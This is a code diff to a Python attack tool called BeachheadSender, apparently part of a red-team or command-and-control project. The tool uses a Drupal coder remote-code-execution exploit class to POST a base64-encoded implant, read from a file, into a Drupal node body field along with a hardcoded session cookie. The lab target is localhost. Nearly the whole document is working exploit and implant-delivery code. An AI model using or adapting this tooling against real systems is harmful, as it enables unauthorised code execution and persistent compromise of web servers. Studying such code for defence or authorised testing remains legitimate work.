@@ -6,16 +6,16 @@ from base64 import b64encode
 
 class BeachheadSender:
 
-    c_and_c = '\'print(\"Hello World\")\''
-    request = None
-
-    def __init__(self, ip_addr: str, port: str, path: str):
+    def __init__(self, ip_addr: str, port: str, drupal_path: str, implant_file_path: str):
         self.exploit = DrupalCoderExec()
-        self.request = self.create_request(ip_addr, port, path)
+        self.implant = self.load_implant(implant_file_path)
+        self.request = self.create_request(ip_addr, port, drupal_path)
         pass
 
-    def set_c_and_c(self, c_and_c: str):
-        self.c_and_c = c_and_c
+    def load_implant(self, implant_file_path: str):
+        with open(implant_file_path, 'r') as f:
+            filedata = f.read()
+        return filedata
 
     def create_request(self, ip_addr: str, port: str, path: str) -> requests.models.Response:
         url = "http://" + ip_addr + ":" + port + path
@@ -35,7 +35,7 @@ class BeachheadSender:
                     'Cookie': 'Drupal.toolbar.collapsed=0; has_js=1; SESS3969c8b8b86a6735bbdf41499ed4dd1c=3egn8nOWzcqKC5eYSugFZt4YX9FXZ7m0aI45cswH0SQ',
                     'Connection': 'close'}
         
-        implant = b64encode(self.c_and_c.encode('utf-8')).decode('utf-8')
+        implant = b64encode(self.implant.encode('utf-8')).decode('utf-8')
 
         data =  'title=Upload&body%5Bund%5D%5B0%5D%5Bsummary%5D=&body%5Bund%5D%5B0%5D%5B' 
         data += 'value%5D=' + implant + '&body%5Bund%5D%5B0%5D%5Bformat%5D=filtered_html'
@@ -57,5 +57,7 @@ class BeachheadSender:
 
 
 if __name__ == "__main__":
-    sender = BeachheadSender(ip_addr='127.0.0.1', port='8082', path='')
+    sender = BeachheadSender(ip_addr='127.0.0.1', port='8082',
+                             drupal_path='', implant_file_path='test/cnc_test1.py')
+    # print(sender.implant)
     sender.send_request()
